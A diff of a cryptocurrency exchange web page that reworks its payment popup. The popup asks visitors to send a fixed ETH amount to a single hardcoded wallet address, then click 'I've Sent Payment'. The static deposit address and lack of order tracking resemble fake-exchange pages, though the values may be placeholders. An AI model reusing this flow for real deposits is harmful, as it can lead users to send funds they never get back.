@@ -111,60 +111,38 @@
     <!-- Bottom Navigation Bar -->
     <div class="bottom-bar"></div>
 
-    <!-- Payment Modal -->
-    <div class="payment-modal" id="paymentModal">
-        <div class="payment-content">
-            <div class="payment-header">
-                <h2>Complete Your Payment</h2>
-                <button class="close-payment-btn" id="closePayment">✕</button>
+    <!-- Payment Popup -->
+    <div class="payment-popup" id="paymentPopup">
+        <div class="popup-box">
+            <button class="close-popup" id="closePopup">×</button>
+            
+            <h2>Send <span id="cryptoToSend">ETH</span> Now</h2>
+            
+            <div class="amount-box">
+                <div class="big-amount">
+                    <span id="amountToSend">0.30788970</span>
+                    <span id="cryptoCode">ETH</span>
+                </div>
+                <div class="usd-value">≈ $<span id="usdValue">945.73</span></div>
             </div>
             
-            <div class="payment-body">
-                <div class="payment-instructions">
-                    <h3>Send <span id="paymentCrypto">ETH</span> to Complete Exchange</h3>
-                    <p>To receive your exchanged cryptocurrency, you need to send the exact amount shown below:</p>
-                </div>
-
-                <div class="send-crypto-box">
-                    <div class="amount-to-send">
-                        <span class="send-label">Amount to Send</span>
-                        <div class="send-amount-display">
-                            <span class="crypto-amount-large" id="cryptoAmountToSend">0.30788970</span>
-                            <span class="crypto-symbol" id="cryptoSymbol">ETH</span>
-                        </div>
-                        <span class="usd-equivalent">≈ $<span id="usdEquivalent">945.73</span> USD</span>
-                    </div>
-                    
-                    <div class="wallet-address-box">
-                        <span class="address-label">Send to this address:</span>
-                        <div class="address-display">
-                            <span class="address-text" id="walletAddress">0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877</span>
-                            <button class="copy-btn" onclick="copyAddress()">📋 Copy</button>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="exchange-info">
-                    <div class="info-item">
-                        <span>You will receive:</span>
-                        <strong id="receiveInfo">$950.00 USD worth of BTC</strong>
-                    </div>
-                    <div class="info-item">
-                        <span>Exchange rate:</span>
-                        <strong id="rateInfo">1 ETH = 0.0325 BTC</strong>
-                    </div>
-                </div>
-
-                <div class="payment-timer">
-                    <span>Price guaranteed for:</span>
-                    <span class="timer" id="paymentTimer">14:59</span>
-                </div>
-
-                <div class="confirmation-notice">
-                    <span class="notice-icon">⚠️</span>
-                    <p><strong>Important:</strong> Your transaction requires 3 network confirmations before the exchange is processed. This typically takes 10-30 minutes depending on network congestion.</p>
+            <div class="address-section">
+                <label>Send to:</label>
+                <div class="address-box">
+                    <span id="depositAddress">0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877</span>
+                    <button onclick="copyAddress()">Copy</button>
                 </div>
             </div>
+            
+            <div class="qr-code">
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877" alt="QR Code">
+            </div>
+            
+            <div class="warning">
+                ⚠️ Requires 3 confirmations
+            </div>
+            
+            <button class="done-btn" onclick="closePaymentPopup()">I've Sent Payment</button>
         </div>
     </div>
 
